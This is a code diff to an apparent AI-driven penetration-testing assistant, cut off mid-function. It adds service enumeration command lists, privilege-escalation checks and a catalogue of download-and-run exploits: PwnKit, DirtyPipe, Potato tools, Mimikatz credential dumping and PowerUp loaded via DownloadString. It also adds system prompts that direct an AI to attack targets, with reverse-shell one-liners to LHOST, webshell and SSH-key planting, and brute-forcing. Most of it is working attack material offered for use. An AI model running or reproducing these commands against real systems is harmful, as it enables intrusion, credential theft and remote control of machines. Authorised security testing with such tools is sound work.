@@ -53,7 +53,7 @@ BANNER = r"""
  \  \/  /  ___    /   \/  _  \ ___
   >    <   \_ \  / /\  \  ___// _ \
  /__/\__\.__) /_/  \_/\__|  /_/ \_\
-  Pentest AI Assistant  v0.2
+  Pentest AI Assistant  v0.3
 """
 
 # ---------------------------------------------------------------------------
@@ -65,16 +65,131 @@ RECON_CHECKS = [
     ("Full TCP scan (all ports)", "nmap -Pn -p- -T4 --min-rate 1000 {target}"),
     ("UDP top 20", "nmap -Pn -sU --top-ports 20 -T3 {target}"),
     ("OS detection", "nmap -Pn -O {target}"),
+    ("Script scan on open ports", "nmap -Pn -sC -sV --top-ports 100 -T3 {target}"),
 ]
+
+# -- Service-specific enum checks (selected based on detected ports) ----------
+
+ENUM_FTP_CHECKS = [
+    ("FTP anonymous login", "nmap -Pn -p21 --script ftp-anon {target}"),
+    ("FTP banner & methods", "nmap -Pn -p21 -sV --script ftp-syst {target}"),
+    ("FTP bounce check", "nmap -Pn -p21 --script ftp-bounce {target}"),
+]
+
+ENUM_SSH_CHECKS = [
+    ("SSH banner & algorithms", "nmap -Pn -p22 -sV --script ssh2-enum-algos {target}"),
+    ("SSH auth methods", "nmap -Pn -p22 --script ssh-auth-methods {target}"),
+]
+
+ENUM_SMTP_CHECKS = [
+    ("SMTP commands", "nmap -Pn -p25 --script smtp-commands {target}"),
+    ("SMTP open relay", "nmap -Pn -p25 --script smtp-open-relay {target}"),
+    ("SMTP user enum (VRFY)", "smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t {target} 2>/dev/null | head -30 || echo 'smtp-user-enum not installed'"),
+]
+
+ENUM_DNS_CHECKS = [
+    ("DNS version", "nmap -Pn -p53 --script dns-nsid {target}"),
+    ("DNS brute", "nmap -Pn -p53 --script dns-brute {target}"),
+    ("Zone transfer attempt", "dig axfr @{target} 2>/dev/null | head -50 || echo 'dig not available'"),
+]
+
+ENUM_HTTP_CHECKS = [
+    ("HTTP headers", "curl -sI http://{target}/ --connect-timeout 5"),
+    ("HTTPS headers", "curl -skI https://{target}/ --connect-timeout 5"),
+    ("HTTP robots.txt", "curl -s http://{target}/robots.txt --connect-timeout 5"),
+    ("HTTP sitemap.xml", "curl -s http://{target}/sitemap.xml --connect-timeout 5 | head -30"),
+    ("Git exposure", "curl -s http://{target}/.git/HEAD --connect-timeout 5"),
+    ("WhatWeb fingerprint", "whatweb -v http://{target} 2>/dev/null || echo 'whatweb not installed'"),
+    ("Gobuster dirs", "gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt -t 20 -q 2>/dev/null || echo 'gobuster not installed'"),
+    ("Nikto scan", "nikto -h http://{target} -maxtime 120 2>/dev/null || echo 'nikto not installed'"),
+    ("WordPress detect", "curl -s http://{target}/ --connect-timeout 5 | grep -i 'wp-content\\|wordpress'"),
+    ("WordPress scan", "wpscan --url http://{target} --enumerate u,vp,vt --no-update 2>/dev/null || echo 'wpscan not installed'"),
+]
+
+ENUM_SMB_CHECKS = [
+    ("SMB shares (null session)", "smbclient -N -L //{target}/ 2>/dev/null || echo 'smbclient not available or SMB not open'"),
+    ("SMB enum4linux", "enum4linux -a {target} 2>/dev/null | head -100 || echo 'enum4linux not installed'"),
+    ("RPCClient null session", "rpcclient -U '' -N {target} -c 'enumdomusers;enumdomgroups;querydispinfo' 2>/dev/null || echo 'rpcclient failed'"),
+    ("SMB signing check", "nmap -Pn -p445 --script smb-security-mode {target}"),
+    ("SMB known vulns", "nmap -Pn -p445 --script smb-vuln-ms17-010 {target}"),
+    ("CrackMapExec SMB", "crackmapexec smb {target} 2>/dev/null || echo 'crackmapexec not installed'"),
+]
+
+ENUM_NFS_CHECKS = [
+    ("NFS exports", "showmount -e {target} 2>/dev/null || echo 'showmount not available'"),
+    ("NFS mount attempt", "nmap -Pn -p2049 --script nfs-ls,nfs-showmount {target}"),
+]
+
+ENUM_MSSQL_CHECKS = [
+    ("MSSQL info", "nmap -Pn -p1433 --script ms-sql-info {target}"),
+    ("MSSQL empty password", "nmap -Pn -p1433 --script ms-sql-empty-password {target}"),
+    ("MSSQL brute (top creds)", "nmap -Pn -p1433 --script ms-sql-brute --script-args userdb=/usr/share/wordlists/metasploit/default_users_for_services_unhash.txt,passdb=/usr/share/wordlists/metasploit/default_pass_for_services_unhash.txt {target}"),
+]
+
+ENUM_MYSQL_CHECKS = [
+    ("MySQL info", "nmap -Pn -p3306 --script mysql-info,mysql-enum {target}"),
+    ("MySQL empty root", "nmap -Pn -p3306 --script mysql-empty-password {target}"),
+    ("MySQL variables", "nmap -Pn -p3306 --script mysql-variables {target} 2>/dev/null | head -30"),
+]
+
+ENUM_RDP_CHECKS = [
+    ("RDP version", "nmap -Pn -p3389 -sV {target}"),
+    ("RDP encryption", "nmap -Pn -p3389 --script rdp-enum-encryption {target}"),
+    ("RDP NLA check", "nmap -Pn -p3389 --script rdp-ntlm-info {target}"),
+]
+
+ENUM_WINRM_CHECKS = [
+    ("WinRM check", "nmap -Pn -p5985,5986 -sV {target}"),
+    ("WinRM brute (if creds)", "crackmapexec winrm {target} 2>/dev/null || echo 'crackmapexec not installed'"),
+]
+
+ENUM_SNMP_CHECKS = [
+    ("SNMP community strings", "onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt {target} 2>/dev/null || echo 'onesixtyone not installed'"),
+    ("SNMP system info", "snmpwalk -v2c -c public {target} 1.3.6.1.2.1.1 2>/dev/null | head -20 || echo 'snmpwalk not available'"),
+    ("SNMP processes", "snmpwalk -v2c -c public {target} 1.3.6.1.2.1.25.4.2 2>/dev/null | head -30 || echo 'snmpwalk not available'"),
+    ("SNMP installed software", "snmpwalk -v2c -c public {target} 1.3.6.1.2.1.25.6.3 2>/dev/null | head -30 || echo 'snmpwalk not available'"),
+    ("SNMP TCP connections", "snmpwalk -v2c -c public {target} 1.3.6.1.2.1.6.13 2>/dev/null | head -30 || echo 'snmpwalk not available'"),
+]
+
+ENUM_REDIS_CHECKS = [
+    ("Redis info", "redis-cli -h {target} INFO 2>/dev/null | head -30 || echo 'redis-cli not available'"),
+    ("Redis config", "redis-cli -h {target} CONFIG GET * 2>/dev/null | head -40 || echo 'redis-cli not available'"),
+]
+
+ENUM_LDAP_CHECKS = [
+    ("LDAP anonymous bind", "ldapsearch -x -H ldap://{target} -b '' -s base namingContexts 2>/dev/null || echo 'ldapsearch not available'"),
+    ("LDAP base search", "ldapsearch -x -H ldap://{target} -b '' -s base '(objectClass=*)' '*' + 2>/dev/null | head -50 || echo 'ldapsearch not available'"),
+]
+
+SERVICE_PORT_MAP = {
+    "21": ENUM_FTP_CHECKS,
+    "22": ENUM_SSH_CHECKS,
+    "25": ENUM_SMTP_CHECKS, "587": ENUM_SMTP_CHECKS,
+    "53": ENUM_DNS_CHECKS,
+    "80": ENUM_HTTP_CHECKS, "443": ENUM_HTTP_CHECKS, "8080": ENUM_HTTP_CHECKS, "8443": ENUM_HTTP_CHECKS,
+    "111": ENUM_NFS_CHECKS, "2049": ENUM_NFS_CHECKS,
+    "139": ENUM_SMB_CHECKS, "445": ENUM_SMB_CHECKS,
+    "1433": ENUM_MSSQL_CHECKS,
+    "3306": ENUM_MYSQL_CHECKS,
+    "3389": ENUM_RDP_CHECKS,
+    "5985": ENUM_WINRM_CHECKS, "5986": ENUM_WINRM_CHECKS,
+    "161": ENUM_SNMP_CHECKS,
+    "6379": ENUM_REDIS_CHECKS,
+    "389": ENUM_LDAP_CHECKS, "636": ENUM_LDAP_CHECKS,
+}
+
+# -- General enum (no port detection, always available) -----------------------
 
 ENUM_LINUX_CHECKS = [
     ("SSH banner grab", "nmap -Pn -p22 -sV {target}"),
     ("HTTP headers", "curl -sI http://{target}/ --connect-timeout 5"),
     ("HTTPS headers", "curl -skI https://{target}/ --connect-timeout 5"),
     ("HTTP robots.txt", "curl -s http://{target}/robots.txt --connect-timeout 5"),
+    ("Git exposure check", "curl -s http://{target}/.git/HEAD --connect-timeout 5"),
     ("Gobuster dirs", "gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt -t 20 -q 2>/dev/null || echo 'gobuster not installed'"),
     ("SMB shares", "smbclient -N -L //{target}/ 2>/dev/null || echo 'smbclient not available or SMB not open'"),
     ("RPCClient null session", "rpcclient -U '' -N {target} -c 'enumdomusers' 2>/dev/null || echo 'rpcclient failed'"),
+    ("NFS exports", "showmount -e {target} 2>/dev/null || echo 'showmount not available or NFS not open'"),
     ("SNMP community check", "snmpwalk -v2c -c public {target} 2>/dev/null | head -30 || echo 'snmpwalk not available or SNMP not open'"),
 ]
 
@@ -85,36 +200,249 @@ ENUM_WINDOWS_CHECKS = [
     ("LDAP anonymous bind", "ldapsearch -x -H ldap://{target} -b '' -s base namingContexts 2>/dev/null || echo 'ldapsearch not available or LDAP not open'"),
     ("WinRM check", "nmap -Pn -p5985,5986 -sV {target}"),
     ("RDP check", "nmap -Pn -p3389 -sV {target}"),
+    ("MSSQL check", "nmap -Pn -p1433 -sV --script ms-sql-info {target}"),
+    ("SNMP check", "snmpwalk -v2c -c public {target} 2>/dev/null | head -30 || echo 'snmpwalk not available'"),
 ]
 
+# -- Privilege escalation checks ----------------------------------------------
+
 PRIVESC_LINUX_CHECKS = [
-    ("Current user", "id; whoami; hostname"),
-    ("Kernel info", "uname -a; cat /etc/os-release 2>/dev/null"),
+    ("Current user & groups", "id; whoami; hostname; groups"),
+    ("Kernel & OS info", "uname -a; cat /etc/os-release 2>/dev/null"),
     ("Sudo permissions", "sudo -n -l 2>&1"),
+    ("Sudo version", "sudo --version 2>/dev/null | head -1"),
     ("SUID binaries", "find / -perm -4000 -type f 2>/dev/null | head -40"),
+    ("SGID binaries", "find / -perm -2000 -type f 2>/dev/null | head -20"),
     ("Capabilities", "getcap -r / 2>/dev/null | head -30"),
+    ("Interesting groups", "id | grep -Eo '(disk|docker|lxd|lxc|adm|video|shadow|root)'"),
+    ("Docker socket", "ls -la /var/run/docker.sock 2>/dev/null; docker ps 2>/dev/null"),
+    ("LXD membership", "lxc list 2>/dev/null; id | grep lxd"),
     ("Writable /etc files", "find /etc -writable -type f 2>/dev/null"),
-    ("Cron jobs", "cat /etc/crontab 2>/dev/null; ls -la /etc/cron* 2>/dev/null; crontab -l 2>/dev/null"),
+    ("Cron jobs", "cat /etc/crontab 2>/dev/null; ls -la /etc/cron.d/ 2>/dev/null; crontab -l 2>/dev/null"),
+    ("Writable cron dirs", "find /etc/cron* /var/spool/cron -writable 2>/dev/null"),
     ("Running services", "ps aux --sort=-rss | head -30"),
-    ("Interesting files", "find / -name '*.bak' -o -name '*.old' -o -name '*.conf' -o -name '*password*' -o -name '*secret*' 2>/dev/null | grep -v proc | head -30"),
+    ("Internal listeners", "ss -tlnp 2>/dev/null | grep 127 || netstat -tlnp 2>/dev/null | grep 127"),
     ("Network connections", "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null"),
+    ("Interesting files", "find / -name '*.bak' -o -name '*.old' -o -name '*.conf' -o -name '*password*' -o -name '*secret*' 2>/dev/null | grep -v proc | head -30"),
+    ("SSH keys", "find / -name 'id_rsa' -o -name 'id_ed25519' -o -name 'id_ecdsa' -o -name 'authorized_keys' 2>/dev/null"),
+    ("Bash history", "cat /home/*/.bash_history /root/.bash_history 2>/dev/null | head -50"),
     ("Home directories", "ls -la /home/ 2>/dev/null; ls -la /root/ 2>/dev/null"),
     ("Writable PATH dirs", "for d in $(echo $PATH | tr ':' ' '); do [ -w \"$d\" ] && echo \"WRITABLE: $d\"; done"),
-    ("Docker/LXC check", "id | grep -i docker; ls -la /var/run/docker.sock 2>/dev/null; cat /proc/1/cgroup 2>/dev/null | head -5"),
+    ("Writable Python libs", "find / -writable -name '*.py' 2>/dev/null | grep -v __pycache__ | head -20"),
+    ("Container check", "cat /proc/1/cgroup 2>/dev/null | head -5; ls /.dockerenv 2>/dev/null"),
+    ("Polkit version", "pkexec --version 2>/dev/null"),
+    ("PKEXEC SUID", "ls -la $(which pkexec 2>/dev/null) 2>/dev/null"),
+    ("NFS no_root_squash", "cat /etc/exports 2>/dev/null"),
+    ("Mounted shares", "mount | grep -E 'nfs|cifs|smb'"),
+    ("Mail & config files", "find /var/mail /var/spool/mail /opt -readable -type f 2>/dev/null | head -20"),
 ]
 
 PRIVESC_WINDOWS_CHECKS = [
     ("Current user", "whoami /all"),
-    ("System info", "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\" /C:\"Domain\""),
+    ("System info", "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\" /C:\"Domain\" /C:\"Hotfix\""),
     ("Token privileges", "whoami /priv"),
+    ("SeImpersonate check", "whoami /priv | findstr /i SeImpersonate"),
+    ("SeBackup/SeRestore", "whoami /priv | findstr /i \"SeBackup SeRestore SeDebug SeTakeOwnership\""),
     ("Local admins", "net localgroup Administrators"),
+    ("All local groups", "net localgroup"),
+    ("Domain info", "net user /domain 2>nul | head -20"),
     ("Services with weak perms", "wmic service get name,pathname,startmode,startname 2>nul | findstr /i /v \"C:\\Windows\" | head -30"),
-    ("Scheduled tasks", "schtasks /query /fo TABLE /nh 2>nul | head -30"),
     ("Unquoted service paths", "wmic service get name,displayname,pathname,startmode 2>nul | findstr /i /v \"C:\\Windows\\\" | findstr /i /v \"\\\"\""),
+    ("Scheduled tasks", "schtasks /query /fo TABLE /nh 2>nul | head -30"),
     ("AlwaysInstallElevated", "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul & reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul"),
+    ("UAC level", "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin 2>nul"),
     ("Stored credentials", "cmdkey /list"),
+    ("Registry autologon", "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultUserName 2>nul & reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword 2>nul"),
+    ("SAM file ACL", "icacls C:\\Windows\\System32\\config\\SAM 2>nul"),
+    ("PowerShell history", "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>nul | head -50"),
+    ("Installed software", "wmic product get name,version 2>nul | head -30"),
     ("Network connections", "netstat -ano | findstr LISTENING"),
+    ("Mounted drives", "wmic logicaldisk get caption,description,volumename 2>nul"),
+    ("Firewall state", "netsh advfirewall show allprofiles state 2>nul"),
 ]
+
+# ---------------------------------------------------------------------------
+# Tool recommendation engine — suggest-only tools (need download)
+# ---------------------------------------------------------------------------
+
+TOOL_SUGGESTIONS = [
+    {
+        "name": "linpeas",
+        "description": "Linux privilege escalation audit script — comprehensive automated enumeration",
+        "phase": "privesc",
+        "os": "linux",
+        "condition": "uname -a",
+        "download": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh",
+        "usage": "chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh | tee /tmp/linpeas_output.txt",
+    },
+    {
+        "name": "winPEAS",
+        "description": "Windows privilege escalation audit script",
+        "phase": "privesc",
+        "os": "windows",
+        "condition": "systeminfo",
+        "download": "certutil -urlcache -split -f https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe C:\\Temp\\winpeas.exe",
+        "usage": "C:\\Temp\\winpeas.exe",
+    },
+    {
+        "name": "pspy",
+        "description": "Monitor processes without root — reveals cron jobs & scheduled tasks",
+        "phase": "privesc",
+        "os": "linux",
+        "condition": "uname -m",
+        "download": "curl -L https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -o /tmp/pspy64",
+        "usage": "chmod +x /tmp/pspy64 && timeout 120 /tmp/pspy64 -f",
+    },
+    {
+        "name": "PrintSpoofer",
+        "description": "Exploit SeImpersonatePrivilege on Windows 10/Server 2016+",
+        "phase": "privesc",
+        "os": "windows",
+        "condition": "whoami /priv | findstr SeImpersonate",
+        "prereq": "SeImpersonatePrivilege must be Enabled",
+        "download": "certutil -urlcache -split -f https://github.com/itm4n/PrintSpoofer/releases/latest/download/PrintSpoofer64.exe C:\\Temp\\PrintSpoofer.exe",
+        "usage": "C:\\Temp\\PrintSpoofer.exe -i -c cmd",
+    },
+    {
+        "name": "GodPotato",
+        "description": "Universal Potato for SeImpersonate — works on all Windows versions",
+        "phase": "privesc",
+        "os": "windows",
+        "condition": "whoami /priv | findstr SeImpersonate",
+        "prereq": "SeImpersonatePrivilege must be Enabled",
+        "download": "certutil -urlcache -split -f https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET4.exe C:\\Temp\\GodPotato.exe",
+        "usage": "C:\\Temp\\GodPotato.exe -cmd \"cmd /c whoami\"",
+    },
+    {
+        "name": "SigmaPotato",
+        "description": "Another SeImpersonate exploit — alternative to PrintSpoofer/GodPotato",
+        "phase": "privesc",
+        "os": "windows",
+        "condition": "whoami /priv | findstr SeImpersonate",
+        "prereq": "SeImpersonatePrivilege must be Enabled",
+        "download": "certutil -urlcache -split -f https://github.com/tylerdotrar/SigmaPotato/releases/latest/download/SigmaPotato.exe C:\\Temp\\SigmaPotato.exe",
+        "usage": "C:\\Temp\\SigmaPotato.exe --revshell --ip <LHOST> --port <LPORT>",
+    },
+    {
+        "name": "JuicyPotato",
+        "description": "SeImpersonate exploit for older Windows (Server 2008/2012/2016)",
+        "phase": "privesc",
+        "os": "windows",
+        "condition": "whoami /priv | findstr SeImpersonate",
+        "prereq": "SeImpersonatePrivilege Enabled + Windows < Server 2019",
+        "download": "certutil -urlcache -split -f https://github.com/ohpe/juicy-potato/releases/latest/download/JuicyPotato.exe C:\\Temp\\JuicyPotato.exe",
+        "usage": "C:\\Temp\\JuicyPotato.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -a \"/c whoami\" -t *",
+    },
+    {
+        "name": "PwnKit (CVE-2021-4034)",
+        "description": "Polkit pkexec local privilege escalation",
+        "phase": "privesc",
+        "os": "linux",
+        "condition": "pkexec --version 2>/dev/null; ls -la $(which pkexec 2>/dev/null) 2>/dev/null",
+        "prereq": "pkexec must be SUID and polkit version < 0.120",
+        "download": "curl -L https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o /tmp/PwnKit",
+        "usage": "chmod +x /tmp/PwnKit && /tmp/PwnKit",
+    },
+    {
+        "name": "DirtyPipe (CVE-2022-0847)",
+        "description": "Linux kernel exploit for privilege escalation",
+        "phase": "privesc",
+        "os": "linux",
+        "condition": "uname -r",
+        "prereq": "Kernel 5.8 <= version < 5.16.11 / 5.15.25 / 5.10.102",
+        "download": "curl -L https://raw.githubusercontent.com/Al1ex/CVE-2022-0847/main/exp.c -o /tmp/dirty_pipe.c",
+        "usage": "gcc /tmp/dirty_pipe.c -o /tmp/dirty_pipe && /tmp/dirty_pipe /etc/passwd 1 '${openssl_hash}' # replace with password hash",
+    },
+    {
+        "name": "Baron Samedit (CVE-2021-3156)",
+        "description": "Sudo heap overflow for privilege escalation",
+        "phase": "privesc",
+        "os": "linux",
+        "condition": "sudo --version 2>/dev/null | head -1",
+        "prereq": "Sudo 1.8.2 through 1.8.31p2 / 1.9.0 through 1.9.5p1",
+        "download": "git clone https://github.com/blasty/CVE-2021-3156.git /tmp/baron_samedit",
+        "usage": "cd /tmp/baron_samedit && make && ./sudo-hax-me-a-sandwich <target_number>",
+    },
+    {
+        "name": "traitor",
+        "description": "Automated Linux privilege escalation — tries known exploits",
+        "phase": "privesc",
+        "os": "linux",
+        "condition": "uname -a",
+        "download": "curl -L https://github.com/liamg/traitor/releases/latest/download/traitor-amd64 -o /tmp/traitor",
+        "usage": "chmod +x /tmp/traitor && /tmp/traitor -a",
+    },
+    {
+        "name": "Mimikatz",
+        "description": "Windows credential harvesting — extracts passwords, hashes, Kerberos tickets",
+        "phase": "privesc",
+        "os": "windows",
+        "condition": "whoami /priv | findstr SeDebug",
+        "prereq": "Requires admin/SYSTEM or SeDebugPrivilege",
+        "download": "certutil -urlcache -split -f https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip C:\\Temp\\mimikatz.zip",
+        "usage": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"",
+    },
+    {
+        "name": "PowerUp",
+        "description": "Windows privilege escalation audit via PowerShell",
+        "phase": "privesc",
+        "os": "windows",
+        "condition": "powershell -c \"$PSVersionTable.PSVersion\" 2>nul",
+        "download": "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')\"",
+        "usage": "powershell -c \"Import-Module .\\PowerUp.ps1; Invoke-AllChecks\"",
+    },
+    {
+        "name": "chisel",
+        "description": "TCP/UDP tunneling over HTTP — port forwarding & pivoting",
+        "phase": "access",
+        "os": "any",
+        "condition": "ss -tlnp 2>/dev/null | grep 127 || netstat -tlnp 2>/dev/null | grep 127",
+        "prereq": "Internal services listening on localhost only",
+        "download": "curl -L https://github.com/jpillora/chisel/releases/latest/download/chisel_linux_amd64.gz -o /tmp/chisel.gz && gunzip /tmp/chisel.gz",
+        "usage": "# On attacker: chisel server -p 8000 --reverse\n# On target: ./chisel client <LHOST>:8000 R:<LOCAL_PORT>:127.0.0.1:<REMOTE_PORT>",
+    },
+    {
+        "name": "ligolo-ng",
+        "description": "Advanced tunneling/pivoting tool — creates tun interfaces",
+        "phase": "access",
+        "os": "any",
+        "condition": "ip route 2>/dev/null || route print 2>nul",
+        "prereq": "Need to reach another subnet through compromised host",
+        "download": "# Download agent for target from https://github.com/nicocha30/ligolo-ng/releases\n# Download proxy for attacker machine",
+        "usage": "# Attacker: ./proxy -selfcert -laddr 0.0.0.0:11601\n# Target: ./agent -connect <LHOST>:11601 -ignore-cert",
+    },
+    {
+        "name": "php_filter_chain_generator",
+        "description": "Generate PHP filter chains for LFI-to-RCE without file upload",
+        "phase": "access",
+        "os": "any",
+        "condition": "curl -s http://{target}/ --connect-timeout 5 | grep -i php",
+        "prereq": "PHP LFI vulnerability must exist",
+        "download": "git clone https://github.com/synacktiv/php_filter_chain_generator.git /tmp/php_filter_chain",
+        "usage": "python3 /tmp/php_filter_chain/php_filter_chain_generator.py --chain '<?php system($_GET[\"cmd\"]);?>'",
+    },
+    {
+        "name": "git-dumper",
+        "description": "Dump exposed .git directories from web servers",
+        "phase": "enum",
+        "os": "any",
+        "condition": "curl -s http://{target}/.git/HEAD --connect-timeout 5",
+        "prereq": ".git directory must be accessible",
+        "download": "pip3 install git-dumper",
+        "usage": "git-dumper http://{target}/.git /tmp/git_dump",
+    },
+]
+
+
+def get_relevant_tools(session: Session) -> list[dict]:
+    relevant = []
+    for tool in TOOL_SUGGESTIONS:
+        if tool["phase"] not in (session.phase, "any") and session.phase != tool["phase"]:
+            continue
+        if tool["os"] not in (session.target_os, "any", "") and session.target_os:
+            continue
+        relevant.append(tool)
+    return relevant
 
 
 # ---------------------------------------------------------------------------
@@ -394,29 +722,114 @@ Rules:
 - When done or stuck, say DONE: followed by a summary.
 - When the operator provides a credential, use it in your suggested commands.
 - For remote commands (SSH session active), suggest commands that run ON the target.
+
+IMPORTANT — Tool execution split:
+- EXECUTE DIRECTLY: nmap, curl, gobuster, feroxbuster, nikto, enum4linux, smbclient,
+  rpcclient, ldapsearch, snmpwalk, dig, whatweb, wpscan, hydra, hashcat, john,
+  searchsploit, ssh, crackmapexec, redis-cli, mysql, mssqlclient.py, ftp,
+  id, whoami, uname, sudo -l, find (SUID/SGID/writable), getcap, ps, ss, netstat,
+  cat, ls, mount, crontab, systeminfo, net, reg query, whoami /priv, schtasks, wmic,
+  cmdkey, netsh, icacls.
+- SUGGEST ONLY (need download): linpeas, winpeas, pspy, PrintSpoofer, GodPotato,
+  SigmaPotato, JuicyPotato, PwnKit, DirtyPipe, Baron Samedit, traitor, Mimikatz,
+  PowerUp, chisel, ligolo-ng, php_filter_chain_generator, git-dumper, msfvenom payloads,
+  kernel exploits, Rubeus, BloodHound, SharpHound.
+  For suggest-only tools: check prerequisites first with built-in commands, then say
+  TOOL: <name> — <what it does> and explain how to download and use it.
 """
 
 PHASE_PROMPTS = {
     "recon": """\
-Phase: RECONNAISSANCE. Identify open ports, services, versions. Start with network scans.
-Suggest nmap scans appropriate for the target. After port discovery, probe interesting services.""",
+Phase: RECONNAISSANCE. Identify open ports, services, versions.
+Decision tree:
+1. Quick TCP scan (top 100 ports) → identify services
+2. Full TCP scan (all 65535) → catch non-standard ports
+3. UDP top 20 → DNS, SNMP, TFTP, NTP
+4. Script scan (-sC) on discovered ports → version + vuln detection
+5. OS detection if needed
+After scans: note each open port, its service, and its version — these drive the enum phase.""",
 
     "enum": """\
-Phase: ENUMERATION. Gather detailed info: users, shares, web apps, misconfigs.
-Use credentials if provided. Try service-specific enumeration (HTTP, SMB, LDAP, etc).
-If SSH credentials are available, suggest remote commands to run on the target.""",
+Phase: ENUMERATION. Gather detailed info per service.
+Service-specific decision tree:
+- FTP(21): anonymous login → list files → download interesting ones
+- SSH(22): banner grab → check auth methods → brute-force if authorized
+- SMTP(25): VRFY/EXPN user enum → check for open relay
+- DNS(53): zone transfer → subdomain brute-force
+- HTTP(80/443/8080): headers → robots.txt → .git exposure → directory brute → CMS detection
+  → If WordPress: wpscan users+vulns → plugin/theme vulns
+  → If file upload: test extensions → webshell
+  → If LFI: /etc/passwd → log poisoning → filter chain RCE
+  → If SQLi: test with ' and UNION → dump creds
+- NFS(2049): showmount → mount if no_root_squash → plant SSH key
+- SMB(139/445): null session → shares → download files → known vulns (EternalBlue)
+- MSSQL(1433): info → empty password → xp_cmdshell if SA
+- MySQL(3306): info → empty root → file read (LOAD_FILE)
+- RDP(3389): version → NLA check → brute-force if authorized
+- WinRM(5985): check → evil-winrm if creds available
+- SNMP(161): community strings → system/process/software/users enum
+- Redis(6379): INFO → CONFIG → write webshell/SSH key
+- LDAP(389): anonymous bind → dump users/groups
+Use credentials if provided. Try service-specific enumeration.""",
 
     "access": """\
 Phase: INITIAL ACCESS. Find a way in based on enumeration results.
-Suggest exploits, credential attacks, or service-specific techniques.
-Give practical one-liner commands. If you find a working method, present it clearly with ACCESS:
-Prioritize: known CVEs for detected versions, default creds, misconfigs, web vulns.""",
+Attack vectors to consider (priority order):
+1. Known CVEs for detected service versions (searchsploit + manual)
+2. Default/weak credentials (hydra/crackmapexec for SSH/RDP/WinRM/SMB/FTP)
+3. Web vulnerabilities: SQLi → creds/RCE, LFI → log poisoning/filter chain, file upload → webshell
+4. SMB: writable shares → place payload, MS17-010 (EternalBlue)
+5. MSSQL: xp_cmdshell, file write
+6. Redis: write SSH key or webshell
+7. NFS: mount + plant SSH key
+8. Password reuse across services
+Reverse shell options:
+- bash -i >& /dev/tcp/LHOST/LPORT 0>&1
+- python3 -c 'import socket,subprocess,os;...'
+- nc -e /bin/sh LHOST LPORT (or mkfifo variant)
+- powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('LHOST',LPORT);..."
+Give practical one-liner commands. For tools needing download (msfvenom, exploit scripts),
+explain what to download and how to use it — say TOOL: <name>.""",
 
     "privesc": """\
 Phase: PRIVILEGE ESCALATION. You have a shell on the target.
 Commands run ON the target via SSH or manual paste.
-Systematically check: SUID/SGID, capabilities, sudo, cron, services, kernel, docker, writable paths.
-When you find a path, give the exact escalation command with ACCESS:""",
+
+Linux escalation decision tree:
+1. id/groups → disk group? docker? lxd? adm?
+   - docker group → docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+   - disk group → debugfs /dev/sda1 → read /etc/shadow
+   - lxd group → import alpine image → mount root filesystem
+2. sudo -l → what can we run?
+   - GTFOBins: check each allowed binary at https://gtfobins.github.io
+   - sudo env_keep (LD_PRELOAD) → compile shared lib → sudo any command
+   - (ALL) NOPASSWD → direct root
+3. SUID/SGID binaries → known exploitable? (GTFOBins)
+4. Capabilities → cap_setuid on python/perl → setuid(0) + shell
+5. Cron jobs → writable script? wildcard injection (tar)? PATH hijack?
+6. Writable PATH dirs → place malicious binary
+7. Python library hijack → writable .py in import path
+8. Kernel version → suggest kernel exploit (DirtyPipe, PwnKit, etc.)
+9. NFS no_root_squash → mount + create SUID shell
+10. SSH key injection → write to /root/.ssh/authorized_keys if writable
+
+Windows escalation decision tree:
+1. whoami /priv → SeImpersonate? → suggest Potato family (PrintSpoofer/GodPotato)
+   - SeBackup/SeRestore → backup SAM/SYSTEM → dump hashes
+   - SeDebug → suggest Mimikatz
+2. Services → unquoted paths? weak ACLs? writable service binary?
+3. Scheduled tasks → writable script? missing binary?
+4. AlwaysInstallElevated → craft MSI payload
+5. Stored credentials → cmdkey /list → runas /savecred
+6. Registry autologon → plaintext passwords
+7. UAC bypass if medium integrity admin
+8. Third-party software → known CVEs
+9. PowerShell history → leaked credentials
+10. SAM/SYSTEM file ACLs → dump and crack offline
+
+For tools that NEED DOWNLOAD (linpeas/winpeas/pspy/Potato family/PwnKit/Mimikatz/PowerUp):
+Check the prerequisite condition with built-in commands FIRST, then say
+TOOL: <name> and explain download + usage. Do NOT suggest CMD: for download commands.""",
 }
 
 
@@ -458,6 +871,7 @@ class AIResponse:
     findings: list[str] = field(default_factory=list)
     needs: list[str] = field(default_factory=list)
     access_line: str | None = None
+    tool_suggestions: list[str] = field(default_factory=list)
     done: bool = False
     done_summary: str = ""
 
@@ -474,6 +888,8 @@ def parse_ai_response(text: str) -> AIResponse:
             resp.needs.append(stripped[5:].strip())
         elif stripped.startswith("ACCESS:"):
             resp.access_line = stripped[7:].strip()
